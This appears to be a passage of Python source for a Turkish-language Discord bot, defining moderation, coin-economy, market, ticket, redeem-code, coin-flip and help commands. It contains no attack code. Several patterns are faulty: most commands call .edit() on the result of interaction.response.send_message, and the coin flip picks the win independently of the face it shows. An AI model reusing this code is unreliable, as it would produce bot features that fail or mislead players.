@bot.tree.command(name="timeout", description="Kullanıcıyı timeout'a atar")
@has_command_permission('timeout')
async def timeout_tr(
    interaction: discord.Interaction, 
    kullanıcı: discord.Member, 
    süre: str, 
    sebep: Optional[str] = "Sebep belirtilmedi"
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        süre_saniye = parse_time(süre)
        until = datetime.datetime.now() + datetime.timedelta(seconds=süre_saniye)
        await kullanıcı.timeout(until, reason=sebep)
        
        add_punishment(
            str(kullanıcı.id), 
            "timeout", 
            interaction.guild.id, 
            sebep, 
            süre, 
            interaction.user.id
        )
        
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "timed_out", user=kullanıcı.mention)
        )
        await sent_message.edit(view=TranslateView(f"Timed out {kullanıcı.mention} for {süre}"))
        
        await send_mod_log(
            interaction.guild, 
            "Timeout", 
            kullanıcı, 
            interaction.user, 
            reason=sebep,
            duration=süre
        )
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ Timeout başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Timeout failed: {str(e)}"))

@bot.tree.command(name="sustur", description="Kullanıcıyı susturur")
@has_command_permission('mute')
async def mute_tr(
    interaction: discord.Interaction, 
    kullanıcı: discord.Member, 
    süre: Optional[str] = None, 
    sebep: Optional[str] = "Sebep belirtilmedi"
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        for kanal in interaction.guild.channels:
            if isinstance(kanal, discord.TextChannel):
                await kanal.set_permissions(kullanıcı, send_messages=False)
        
        add_punishment(
            str(kullanıcı.id), 
            "mute", 
            interaction.guild.id, 
            sebep, 
            süre, 
            interaction.user.id
        )
        
        embed = discord.Embed(
            title="🔇 Susturma Uygulandı!",
            description=get_text(str(interaction.guild.id), "muted", user=kullanıcı.mention),
            color=get_rainbow_color()
        )
        embed.add_field(name="Sebep", value=sebep, inline=False)
        
        if süre:
            embed.add_field(name="Süre", value=süre, inline=True)
        
        embed.set_footer(text=f"Eylem: {interaction.user.display_name}")
        sent_message = await interaction.response.send_message(embed=embed)
        await sent_message.edit(view=TranslateView(f"Muted {kullanıcı.mention}. Reason: {sebep}"))
        
        await send_mod_log(
            interaction.guild, 
            "Susturma", 
            kullanıcı, 
            interaction.user, 
            reason=sebep,
            duration=süre
        )
        
        if süre:
            süre_saniye = parse_time(süre)
            await asyncio.sleep(süre_saniye)
            for kanal in interaction.guild.channels:
                if isinstance(kanal, discord.TextChannel):
                    await kanal.set_permissions(kullanıcı, overwrite=None)
                    
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ Susturma başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Mute failed: {str(e)}"))

# Sampy Coin Sistemi - Türkçe
@bot.tree.command(name="sampy-coin", description="Sampy Coin bakiyenizi gösterir")
async def sampy_coin_tr(interaction: discord.Interaction, kullanıcı: Optional[discord.Member] = None):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    hedef_kullanıcı = kullanıcı or interaction.user
    coins = get_user_coins(str(hedef_kullanıcı.id))
    sent_message = await interaction.response.send_message(
        get_text(str(interaction.guild.id), "coins", user=hedef_kullanıcı.mention, amount=coins)
    )
    await sent_message.edit(view=TranslateView(f"{hedef_kullanıcı.mention}'s Sampy Coin balance: {coins}"))

@bot.tree.command(name="sampy-coin-al", description="Kullanıcıdan Sampy Coin alır")
@is_bot_owner()
async def sampy_coin_take_tr(interaction: discord.Interaction, hedef: str, miktar: int):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if hedef.isdigit():
        user_id = hedef
    else:
        user_id = hedef.strip('<@!>')
    
    user_coins = get_user_coins(user_id)
    
    if user_coins < miktar:
        sent_message = await interaction.response.send_message(
            f"❌ Kullanıcıda yeterli Sampy Coin yok! Mevcut: {user_coins}",
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"User doesn't have enough Sampy Coin! Current: {user_coins}"))
        return
    
    update_user_coins(user_id, -miktar)
    sent_message = await interaction.response.send_message(
        f"✅ <@{user_id}> kullanıcısından {miktar} Sampy Coin alındı. Yeni bakiye: {get_user_coins(user_id)}",
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView(f"{miktar} Sampy Coin taken from <@{user_id}>. New balance: {get_user_coins(user_id)}"))

@bot.tree.command(name="günlük", description="Günlük Sampy Coin alın (her 12 saatte bir)")
async def daily_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    view = AdvancedDailyView(bot, str(interaction.user.id))
    sent_message = await interaction.response.send_message(
        "🎁 **Günlük Ödül**\nHer 12 saatte bir **750 Sampy Coin** alın!",
        view=view,
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Daily Reward - Claim 750 Sampy Coin every 12 hours!"))

@bot.tree.command(name="sampy-coin-transfer", description="Başka bir kullanıcıya Sampy Coin transfer eder")
async def sampy_coin_transfer_tr(interaction: discord.Interaction, hedef: str, miktar: Optional[str] = None):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    from_user_id = str(interaction.user.id)
    
    if hedef.isdigit():
        to_user_id = hedef
    else:
        to_user_id = hedef.strip('<@!>')
    
    from_coins = get_user_coins(from_user_id)
    
    if miktar is None or miktar.lower() == "tümü":
        transfer_miktar = from_coins
    else:
        try:
            transfer_miktar = int(miktar)
        except:
            sent_message = await interaction.response.send_message("❌ Geçersiz miktar! Sayı veya 'tümü' girin.", ephemeral=True)
            await sent_message.edit(view=TranslateView("Invalid amount! Enter a number or 'all'."))
            return
    
    if transfer_miktar <= 0:
        sent_message = await interaction.response.send_message("❌ Geçersiz miktar!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid amount!"))
        return
        
    if from_coins < transfer_miktar:
        sent_message = await interaction.response.send_message("❌ Yeterli Sampy Coin yok!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Not enough Sampy Coin!"))
        return
    
    try:
        target_user = await bot.fetch_user(int(to_user_id))
        if target_user.bot:
            sent_message = await interaction.response.send_message("❌ Botlara coin transfer edemezsiniz!", ephemeral=True)
            await sent_message.edit(view=TranslateView("You can't transfer coins to bots!"))
            return
    except:
        sent_message = await interaction.response.send_message("❌ Geçersiz kullanıcı!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid user!"))
        return
    
    update_user_coins(from_user_id, -transfer_miktar)
    update_user_coins(to_user_id, transfer_miktar)
    
    sent_message = await interaction.response.send_message(
        get_text(str(interaction.guild.id), "coins_transfer", user=f"<@{to_user_id}>", amount=transfer_miktar)
    )
    await sent_message.edit(view=TranslateView(f"Transferred {transfer_miktar} Sampy Coin to <@{to_user_id}>"))

@bot.tree.command(name="market-kurulum", description="Market ayarlarını yapılandırır")
@is_server_owner()
async def market_setup_tr(
    interaction: discord.Interaction, 
    özel_rol_3g: int, 
    özel_rol_7g: int, 
    vip_30g: int, 
    megavip_30g: int, 
    ultravip_30g: int, 
    süpervip_30g: int, 
    süpervip_artı_30g: int,
    sampy_premium_30g: int
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild_id)
    
    bot.market_data[guild_id] = {
        "special_role_3d": özel_rol_3g,
        "special_role_7d": özel_rol_7g,
        "vip_30d": vip_30g,
        "megavip_30d": megavip_30g,
        "ultravip_30d": ultravip_30g,
        "supervip_30d": süpervip_30g,
        "supervip_plus_30d": süpervip_artı_30g,
        "sampy_premium_30d": sampy_premium_30g
    }
    
    bot.save_json(bot.market_data, bot.market_file)
    sent_message = await interaction.response.send_message("✅ Market ayarları başarıyla güncellendi!", ephemeral=True)
    await sent_message.edit(view=TranslateView("Market settings updated successfully!"))

@bot.tree.command(name="market", description="Market ürünlerini görüntüler")
async def market_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild_id)
    
    if guild_id not in bot.market_data:
        sent_message = await interaction.response.send_message(
            "❌ Bu sunucu için market yapılandırılmamış! Sunucu sahibi /market-kurulum kullanmalı.",
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView("Market not configured for this server! Server owner must use /market-setup."))
        return
    
    products = bot.market_data[guild_id]
    embed = discord.Embed(title=get_text(guild_id, "market"), color=get_rainbow_color())
    
    for product, price in products.items():
        product_name = get_text(guild_id, product.split('_')[0])
        duration = product.split('_')[1]
        embed.add_field(
            name=f"{product_name} ({duration})",
            value=f"{price} Sampy Coin 🪙",
            inline=False
        )
    
    embed.set_footer(text="Ürün satın almak için /market-satın-al kullanın!")
    sent_message = await interaction.response.send_message(embed=embed)
    await sent_message.edit(view=TranslateView("Sampy Market - View available products"))

@bot.tree.command(name="market-satın-al", description="Marketten ürün satın alır")
async def market_buy_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild_id)
    
    if guild_id not in bot.market_data:
        sent_message = await interaction.response.send_message(get_text(guild_id, "market_not_configured"), ephemeral=True)
        await sent_message.edit(view=TranslateView("Market not configured for this server!"))
        return
    
    view = MarketView(bot, guild_id)
    sent_message = await interaction.response.send_message("🛒 **Satın almak için ürün seçin:**", view=view, ephemeral=True)
    await sent_message.edit(view=TranslateView("Select product to purchase:"))

@bot.tree.command(name="ticket-aç", description="Yeni ticket açar")
async def ticket_open_tr(interaction: discord.Interaction, isim: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild = interaction.guild
    category = discord.utils.get(guild.categories, name="Tickets")
    
    if not category:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        category = await guild.create_category("Tickets", overwrites=overwrites)
    
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
    }
    
    ticket_channel = await category.create_text_channel(
        name=f"ticket-{isim}-{interaction.user.name}",
        overwrites=overwrites
    )
    
    bot.tickets_data[str(ticket_channel.id)] = {
        "user_id": interaction.user.id,
        "created_at": datetime.datetime.now().isoformat(),
        "name": isim
    }
    bot.save_json(bot.tickets_data, bot.tickets_file)
    
    embed = discord.Embed(
        title=f"Ticket - {isim}",
        description=f"Merhaba {interaction.user.mention}! Destek ekibimiz size kısa süre içinde yardımcı olacaktır.\n\nLütfen sorununuzu detaylı bir şekilde açıklayın.",
        color=get_rainbow_color()
    )
    embed.set_footer(text="Ticket'ı kapatmak için aşağıdaki butonu kullanın")
    
    view = TicketView()
    sent_message = await ticket_channel.send(embed=embed, view=view)
    await sent_message.edit(view=TranslateView(f"Ticket - {isim}. Hello {interaction.user.mention}! Our support team will help you shortly."))
    
    sent_message = await interaction.response.send_message(
        get_text(str(interaction.guild.id), "ticket_created", channel=ticket_channel.mention),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView(f"Ticket created: {ticket_channel.mention}"))

@bot.tree.command(name="ticket-kapat", description="Ticket'ı kapatır")
@has_command_permission('ticket-close')
async def ticket_close_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if str(interaction.channel_id) not in bot.tickets_data:
        sent_message = await interaction.response.send_message("❌ Bu bir ticket kanalı değil!", ephemeral=True)
        await sent_message.edit(view=TranslateView("This is not a ticket channel!"))
        return
    
    await interaction.response.send_message("⏳ Ticket 5 saniye içinde kapatılıyor...")
    await asyncio.sleep(5)
    
    del bot.tickets_data[str(interaction.channel_id)]
    bot.save_json(bot.tickets_data, bot.tickets_file)
    
    await interaction.channel.delete()

@bot.tree.command(name="kod-oluştur", description="Yeni kullanım kodu oluşturur")
@is_bot_owner()
async def redeem_create_tr(interaction: discord.Interaction, maks_kullanım: int, miktar: int):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
    
    bot.redeem_data[code] = {
        "max_uses": maks_kullanım,
        "uses": 0,
        "amount": miktar,
        "created_by": interaction.user.id,
        "created_at": datetime.datetime.now().isoformat(),
        "active": True
    }
    
    bot.save_json(bot.redeem_data, bot.redeem_file)
    
    sent_message = await interaction.response.send_message(
        f"✅ **Kullanım Kodu Oluşturuldu!**\n"
        f"**Kod:** `{code}`\n"
        f"**Miktar:** {miktar} Sampy Coin\n"
        f"**Maks Kullanım:** {maks_kullanım} kişi\n\n"
        f"Kullanmak için: `/kod-kullan {code}`",
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView(f"Redeem Code Created! Code: `{code}`, Amount: {miktar}, Max Uses: {maks_kullanım}"))

@bot.tree.command(name="kod-listesi", description="Aktif kullanım kodlarını listeler")
@is_bot_owner()
async def redeem_list_tr(interaction: discord.Interaction, sunucu_id: Optional[str] = None):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    active_codes = {}
    for code, data in bot.redeem_data.items():
        if data.get("active", True) and data["uses"] < data["max_uses"]:
            active_codes[code] = data
    
    if not active_codes:
        sent_message = await interaction.response.send_message("❌ Aktif kullanım kodu yok.", ephemeral=True)
        await sent_message.edit(view=TranslateView("No active redeem codes."))
        return
    
    embed = discord.Embed(title="🎁 Aktif Kullanım Kodları", color=get_rainbow_color())
    
    for code, data in active_codes.items():
        remaining_uses = data["max_uses"] - data["uses"]
        created_date = data["created_at"][:10] if "created_at" in data else "Bilinmiyor"
        
        embed.add_field(
            name=f"Kod: `{code}`",
            value=f"Miktar: {data['amount']} 🪙\nKalan Kullanım: {remaining_uses}/{data['max_uses']}\nOluşturulma: {created_date}",
            inline=False
        )
    
    embed.set_footer(text=f"Toplam {len(active_codes)} aktif kod")
    sent_message = await interaction.response.send_message(embed=embed, ephemeral=True)
    await sent_message.edit(view=TranslateView(f"Active Redeem Codes: {len(active_codes)} codes"))

@bot.tree.command(name="kod-kullan", description="Kullanım kodunu kullanır")
async def redeem_use_tr(interaction: discord.Interaction, code: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    code = code.upper()
    
    if code not in bot.redeem_data:
        sent_message = await interaction.response.send_message("❌ Geçersiz kullanım kodu!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid redeem code!"))
        return
    
    code_data = bot.redeem_data[code]
    
    if not code_data.get("active", True):
        sent_message = await interaction.response.send_message("❌ Bu kullanım kodu aktif değil!", ephemeral=True)
        await sent_message.edit(view=TranslateView("This redeem code is not active!"))
        return
    
    if code_data["uses"] >= code_data["max_uses"]:
        sent_message = await interaction.response.send_message("❌ Bu kullanım kodu kullanım limitine ulaştı!", ephemeral=True)
        await sent_message.edit(view=TranslateView("This redeem code has reached its usage limit!"))
        return
    
    user_id = str(interaction.user.id)
    used_codes = bot.redeem_data.get("used_by", {}).get(code, [])
    
    if user_id in used_codes:
        sent_message = await interaction.response.send_message("❌ Bu kodu zaten kullandınız!", ephemeral=True)
        await sent_message.edit(view=TranslateView("You've already used this code!"))
        return
    
    amount = code_data["amount"]
    update_user_coins(user_id, amount)
    
    bot.redeem_data[code]["uses"] += 1
    
    if "used_by" not in bot.redeem_data:
        bot.redeem_data["used_by"] = {}
    if code not in bot.redeem_data["used_by"]:
        bot.redeem_data["used_by"][code] = []
    
    bot.redeem_data["used_by"][code].append(user_id)
    bot.save_json(bot.redeem_data, bot.redeem_file)
    
    sent_message = await interaction.response.send_message(
        f"🎉 **Kullanım Kodu Başarıyla Kullanıldı!**\n"
        f"**+{amount} Sampy Coin** hesabınıza eklendi!\n"
        f"Yeni bakiye: **{get_user_coins(user_id)} Sampy Coin** 🪙"
    )
    await sent_message.edit(view=TranslateView(f"Redeem Code Successfully Used! +{amount} Sampy Coin added. New balance: {get_user_coins(user_id)} Sampy Coin"))

@bot.tree.command(name="yt", description="Yazı tura oyunu")
async def coin_flip_tr(interaction: discord.Interaction, miktar: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    user_id = str(interaction.user.id)
    user_coins = get_user_coins(user_id)
    
    if miktar.lower() == "tümü":
        bahis_miktar = user_coins
    else:
        try:
            bahis_miktar = int(miktar)
        except:
            sent_message = await interaction.response.send_message("❌ Geçersiz miktar! Sayı veya 'tümü' girin.", ephemeral=True)
            await sent_message.edit(view=TranslateView("Invalid amount! Enter a number or 'all'."))
            return
    
    if bahis_miktar <= 0:
        sent_message = await interaction.response.send_message("❌ Geçersiz miktar!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid amount!"))
        return
        
    if user_coins < bahis_miktar:
        sent_message = await interaction.response.send_message("❌ Yeterli Sampy Coin yok!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Not enough Sampy Coin!"))
        return
    
    result = random.choice(["Yazı", "Tura"])
    win = random.choice([True, False])
    
    if win:
        update_user_coins(user_id, bahis_miktar)
        sent_message = await interaction.response.send_message(
            f"🎲 **{result}**! Kazandınız! 🎉\n"
            f"**+{bahis_miktar} Sampy Coin** kazandınız!\n"
            f"Yeni bakiye: **{get_user_coins(user_id)} Sampy Coin** 🪙"
        )
        await sent_message.edit(view=TranslateView(f"Coin Flip: {result}! You won! +{bahis_miktar} Sampy Coin"))
    else:
        update_user_coins(user_id, -bahis_miktar)
        sent_message = await interaction.response.send_message(
            f"🎲 **{result}**! Kaybettiniz! 😢\n"
            f"**-{bahis_miktar} Sampy Coin** kaybettiniz!\n"
            f"Yeni bakiye: **{get_user_coins(user_id)} Sampy Coin** 🪙"
        )
        await sent_message.edit(view=TranslateView(f"Coin Flip: {result}! You lost! -{bahis_miktar} Sampy Coin"))

@bot.tree.command(name="sunucu", description="Sunucu bilgilerini gösterir")
async def server_info_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild = interaction.guild
    
    embed = discord.Embed(title=get_text(str(guild.id), "server_info"), color=get_rainbow_color())
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    
    embed.add_field(name="👥 Üye Sayısı", value=guild.member_count, inline=True)
    embed.add_field(name="📅 Oluşturulma Tarihi", value=f"<t:{int(guild.created_at.timestamp())}:D>", inline=True)
    embed.add_field(name="👑 Sunucu Sahibi", value=guild.owner.mention, inline=True)
    
    embed.add_field(name="📊 Kanal Sayısı", value=len(guild.channels), inline=True)
    embed.add_field(name="🎭 Rol Sayısı", value=len(guild.roles), inline=True)
    embed.add_field(name="🚀 Sunucu Seviyesi", value=guild.premium_tier, inline=True)
    
    sent_message = await interaction.response.send_message(embed=embed)
    await sent_message.edit(view=TranslateView(f"Server Info: {guild.name} - {guild.member_count} members"))

@bot.tree.command(name="ping", description="Bot gecikmesini gösterir")
async def ping_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    latency = round(bot.latency * 1000)
    sent_message = await interaction.response.send_message(
        get_text(str(interaction.guild.id), "ping", ms=latency),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView(f"Pong! {latency}ms"))

@bot.tree.command(name="yardım", description="Tüm komutları listeler")
async def help_command_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    embed = discord.Embed(title="🤖 Sampy Bot - Tüm Komutlar", color=get_rainbow_color())
    
    embed.add_field(
        name="🎉 Çekiliş Komutları",
        value="• `/çekiliş-oluştur` - Yeni çekiliş başlat\n• `/çekiliş-bitir` - Çekilişi erken bitir\n• `/çekiliş-tekrar-çek` - Yeni kazananlar çek\n• `/çekiliş-katılma-limit` - Katılma limitleri ayarla\n• `/çekiliş-katılma-limit-id` - ID ile limit ayarla\n• `/çekiliş-katılma-limit-sıfırla` - Limitleri sıfırla",
        inline=False
    )
    
    embed.add_field(
        name="🔇 Kanal Yönetimi",
        value="• `/kanal-sustur` - Kanalı sustur\n• `/kanal-susturma-kaldır` - Kanal susturmasını kaldır",
        inline=False
    )
    
    embed.add_field(
        name="🎯 Buton Rol Sistemi", 
        value="• `/buton-rol-sistemi-kurulum` - Buton rol sistemini kur",
        inline=False
    )
    
    embed.add_field(
        name="🛡️ Moderasyon",
        value="• `/at` - Kullanıcıyı at\n• `/yasakla` - Kullanıcıyı yasakla\n• `/yasak-kaldır` - Kullanıcı yasağını kaldır\n• `/timeout` - Kullanıcıyı timeout'a at\n• `/timeout-kaldır` - Timeout'u kaldır\n• `/sustur` - Kullanıcıyı sustur\n• `/susturmayı-kaldır` - Susturmayı kaldır\n• `/ip-ban` - Kullanıcıyı IP banla\n• `/ip-sustur` - Kullanıcıyı IP sustur\n• `/ip-ban-kaldır` - IP banı kaldır\n• `/ip-susturma-kaldır` - IP susturmayı kaldır\n• `/ban-kontrol` - Banlı olup olmadığını kontrol et\n• `/susturma-kontrol` - Susturulmuş olup olmadığını kontrol et\n• `/geçmiş` - Kullanıcının ceza geçmişini göster\n• `/cezalı-kullanıcılar` - Tüm cezalı kullanıcıları göster\n• `/temizle` - Mesajları temizle (sadece bot sahibi)\n• `/uyarı` - Kullanıcıyı uyar\n• `/uyarı-kaldır` - Uyarıyı kaldır\n• `/uyarı-listesi` - Uyarıları göster",
        inline=False
    )
    
    embed.add_field(
        name="🔒 Etiket Engelleme Sistemi",
        value="• `/etiket-engelleme-menüsü` - Menü ile etiket engelle\n• `/etiket-engelleme-id` - ID ile etiket engelle\n• `/etiket-engelleme-listesi` - Engelleme listesini göster",
        inline=False
    )
    
    embed.add_field(
        name="🪙 Sampy Coin Sistemi",
        value="• `/sampy-coin` - Bakiye kontrol\n• `/günlük` - Günlük ödül al\n• `/sampy-coin-transfer` - Coin transfer et\n• `/sampy-coin-al` - Coin al (sadece bot sahibi)",
        inline=False
    )
    
    embed.add_field(
        name="🏪 Market Sistemi",
        value="• `/market` - Ürünleri gör\n• `/market-kurulum` - Market ayarla\n• `/market-satın-al` - Ürün satın al",
        inline=False
    )
    
    embed.add_field(
        name="🎫 Ticket Sistemi",
        value="• `/ticket-aç` - Yeni ticket aç\n• `/ticket-kapat` - Ticket kapat",
        inline=False
    )
    
    embed.add_field(
        name="🎁 Kullanım Kodu",
        value="• `/kod-kullan` - Kod kullan\n• `/kod-listesi` - Kodları listele\n• `/kod-oluştur` - Kod oluştur",
        inline=False
    )
    
    embed.add_field(
        name="🎮 Oyunlar",
        value="• `/sayı-tahmin-oyunu` - Sayı tahmin oyunu oyna\n• `/yt` - Yazı tura oyna",
        inline=False
    )
    
    embed.add_field(
        name="📊 Seviye Sistemi",
        value="• `/seviye` - Seviye kontrol\n• `/seviye-sıralaması` - Sıralamayı göster",
        inline=False
    )
    
    embed.add_field(
        name="🗑️ Silinen Mesajlar",
        value="• `/silinen-mesajlar-listesi` - Silinen mesajları göster (bot sahibi ve sunucu sahibi)",
        inline=False
    )
    
    embed.add_field(
        name="✍️ Yazdır",
        value="• `/yazdır` - Başka kullanıcı adına mesaj gönder (sunucu yönetme izni gerektirir)",
        inline=False
    )
    
    embed.add_field(
        name="📝 Başvuru Sistemi",
        value="• `/yetkili-başvuru-kurulum` - Başvuru sistemini kur (sadece sunucu sahibi)",
        inline=False
    )
    
    embed.add_field(
        name="🔄 Kanalları Sıfırla",
        value="• `/kanalları-sıfırla` - Tüm kanallardaki mesajları sil",
        inline=False
    )
    
    embed.add_field(
        name="🎥 YouTube Sistemi",
        value="• `/youtube-video-kanal-kurulum` - YouTube bildirimleri kur\n• `/youtube-video-kanal-sıfırla` - YouTube ayarlarını sıfırla\n• `/yt-api-anahtarı-al` - API anahtarı rehberi",
        inline=False
    )
    
    embed.add_field(
        name="🤖 Oto Rol Sistemi",
        value="• `/otorol` - Oto-rol ekle/kaldır\n• `/otorol-id` - ID ile oto-rol ekle/kaldır\n• `/otorol-listesi` - Oto-rolleri göster",
        inline=False
    )
    
    embed.add_field(
        name="💾 Rol Veri Kaydet",
        value="• `/rol-veri-kaydet` - Sunucu için rol verilerini kaydet (sadece bot sahibi)",
        inline=False
    )
    
    embed.add_field(
        name="🎪 Geçici Oda Sistemi",
        value="• `/geçici-oda-kurulum` - Geçici oda sistemini kur (sadece sunucu sahibi)",
        inline=False
    )
    
    embed.add_field(
        name="🏗️ Sunucu Kurulum",
        value="• `/sunucu-kurulum` - Sunucu kanallarını kur (sadece sunucu sahibi)",
        inline=False
    )
    
    embed.add_field(
        name="🛠️ Yönetim Komutları",
        value="• `/komut-izin-kurulum-1` - Komut izinleri bölüm 1 (sunucu sahibi)\n• `/komut-izin-kurulum-2` - Komut izinleri bölüm 2 (sunucu sahibi)\n• `/admin-paneli` - Bot yönetim paneli (bot sahibi)\n• `/giriş-çıkış-kanal-ayarla` - Giriş-çıkış kanalı ayarla (sunucu sahibi)\n• `/dil-ayarla` - Bot dilini değiştir (sunucu sahibi)",
        inline=False
    )
    
    embed.add_field(
        name="🔧 Diğer Komutlar",
        value="• `/sunucu` - Sunucu bilgisi\n• `/ping` - Bot gecikmesi\n• `/yardım` - Bu menü",
        inline=False
    )
    
    sent_message = await interaction.response.send_message(embed=embed)
    await sent_message.edit(view=TranslateView("Sampy Bot - All Commands. Use the translate button for other languages."))

# ============================================
# YENİ KOMUTLAR - Feedback, Twitch, Kick, Müzik, Doğrulama, Bombalama
# ============================================

# Feedback/Twitch/Kick/Müzik sistemi için yardımcı fonksiyonlar
bot.music_empty_times = {}

# Feedback Komutları
@bot.tree.command(name="geri-bildirim", description="Bot sahibine geri bildirim gönderir")
async def feedback_tr(interaction: discord.Interaction, mesaj: str):
    user_id = str(interaction.user.id)
    
    # Feedback ban kontrolü
    if user_id in bot.feedback_bans:
        ban_data = bot.feedback_bans[user_id]
        if ban_data.get('expires_at'):
            expires_at = datetime.datetime.fromisoformat(ban_data['expires_at'])
            if datetime.datetime.now() < expires_at:
                remaining = expires_at - datetime.datetime.now()
                sent_message = await interaction.response.send_message(
                    f"❌ Geri bildirim gönderme yetkiniz yok! Kalan süre: {remaining.days} gün {remaining.seconds//3600} saat",
                    ephemeral=True
                )
                await sent_message.edit(view=TranslateView(f"You are banned from sending feedback! Remaining: {remaining.days} days {remaining.seconds//3600} hours"))
                return
            else:
                # Ban süresi doldu
                del bot.feedback_bans[user_id]
                bot.save_json(bot.feedback_bans, "feedback_bans.json")
        else:
            # Süresiz ban
            sent_message = await interaction.response.send_message("❌ Geri bildirim gönderme yetkiniz yok!", ephemeral=True)
            await sent_message.edit(view=TranslateView("You are banned from sending feedback!"))
            return
    
    feedback_id = f"{interaction.user.id}_{int(datetime.datetime.now().timestamp())}"
    
    feedback_data = {
        "id": feedback_id,
        "user_id": interaction.user.id,
        "user_name": str(interaction.user),
        "message": mesaj,
        "timestamp": datetime.datetime.now().isoformat(),
        "guild_id": interaction.guild.id if interaction.guild else None,
        "guild_name": interaction.guild.name if interaction.guild else "DM"
    }
    
    if feedback_id not in bot.feedback_data:
        bot.feedback_data[feedback_id] = feedback_data
        bot.save_json(bot.feedback_data, "feedback_data.json")
    
    # Feedback kanalına gönder veya DM
    feedback_sent = False
    if bot.feedback_channel:
        try:
            channel = bot.get_channel(bot.feedback_channel)
            if channel:
                embed = discord.Embed(
                    title="📝 Yeni Geri Bildirim",
                    color=get_rainbow_color(),
                    timestamp=datetime.datetime.now()
                )
                embed.add_field(name="Kullanıcı", value=f"{interaction.user.mention} ({interaction.user.id})", inline=False)
                embed.add_field(name="Sunucu", value=interaction.guild.name if interaction.guild else "DM", inline=True)
                embed.add_field(name="ID", value=f"`{feedback_id}`", inline=True)
                embed.add_field(name="Mesaj", value=mesaj[:1000], inline=False)
                
                sent_message = await channel.send(embed=embed)
                await sent_message.edit(view=TranslateView(f"New Feedback from {interaction.user} ({interaction.user.id}): {mesaj[:200]}"))
                feedback_sent = True
        except:
            pass
    
    # Bot sahibine DM gönder
    if not feedback_sent:
        for owner_id in BOT_OWNER_IDS:
            try:
                owner = await bot.fetch_user(int(owner_id))
                embed = discord.Embed(
                    title="📝 Yeni Geri Bildirim",
                    color=get_rainbow_color(),
                    timestamp=datetime.datetime.now()
                )
                embed.add_field(name="Kullanıcı", value=f"{interaction.user.mention} ({interaction.user.id})", inline=False)
                embed.add_field(name="Sunucu", value=interaction.guild.name if interaction.guild else "DM", inline=True)
                embed.add_field(name="ID", value=f"`{feedback_id}`", inline=True)
                embed.add_field(name="Mesaj", value=mesaj[:1000], inline=False)
                
                sent_message = await owner.send(embed=embed)
